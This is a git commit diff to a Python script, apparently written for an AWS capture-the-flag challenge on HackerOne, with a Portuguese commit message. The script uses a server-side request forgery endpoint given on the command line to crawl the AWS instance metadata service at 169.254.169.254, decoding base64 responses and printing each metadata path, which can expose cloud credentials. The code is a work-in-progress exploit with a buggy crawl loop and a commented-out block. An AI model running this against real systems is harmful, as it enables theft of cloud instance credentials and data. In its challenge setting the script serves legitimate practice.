3962cb33fc16bbf5ac84d4dd34c9e7235cd89365
Arthur A <aires.arthur.15@gmail.com>
2021-04-08 05:45:54 -0300

    preciso pensar em como escrever essa merda, talvez com recursividade

--- main.py
+++ main.py
@@ -3,21 +3,60 @@ from base64 import b64decode
 from json import loads
 import sys
 
+#AWS CTF HackerOne
+
+def b64DecodeToString(b64Text):
+	return b64decode(loads(b64Text)['page']).decode('utf-8')
+
+
 if "__main__" == __name__:
+
+	FUCKING_DOMAIN_LIST_ACCESS = []
 
 	if len(sys.argv) > 1:
 
 		urlScrapper = ('{}http://169.254.169.254/latest/').format(sys.argv[1])
 
-		firstResponse =  requests.get(urlScrapper).text
+		htmlMetadata = b64DecodeToString(requests.get(urlScrapper).text)
 
-		if '{"page":' in firstResponse:
+		while True:
 
-			htmlMetadata =  b64decode(loads(firstResponse)['page']).decode('utf-8')
+			for a in htmlMetadata.split('\n'):
 
-		else:
+				if "user-data" in a:
+					continue
 
-			htmlMetadata = firstResponse
+				FUCKING_DOMAIN_LIST_ACCESS.append(a)
 
-		for a in htmlMetadata.split('\n'):
-			print(a)
+			for b in FUCKING_DOMAIN_LIST_ACCESS:
+
+				htmlMetadata = b64DecodeToString(requests.get(urlScrapper + b ).text)
+
+				print(b)
+
+				for c in htmlMetadata.split('\n'):
+
+					FUCKING_DOMAIN_LIST_ACCESS.append(b + "/" + c)
+
+					print(c)
+
+				FUCKING_DOMAIN_LIST_ACCESS.remove(b)
+
+			break
+			"""
+			urlDomain = (urlScrapper + b + "/")
+
+			print('Node Number:', (a+1))
+
+			getInfoNode = requests.get(urlDomain)
+
+			print(getInfoNode)
+
+			if getInfoNode.status_code != 200:
+				continue
+
+			getNextTree = requests.get(urlDomain + b64DecodeToString(getInfoNode.text)).text
+
+			print(b64DecodeToString(getNextTree))
+			"""
+
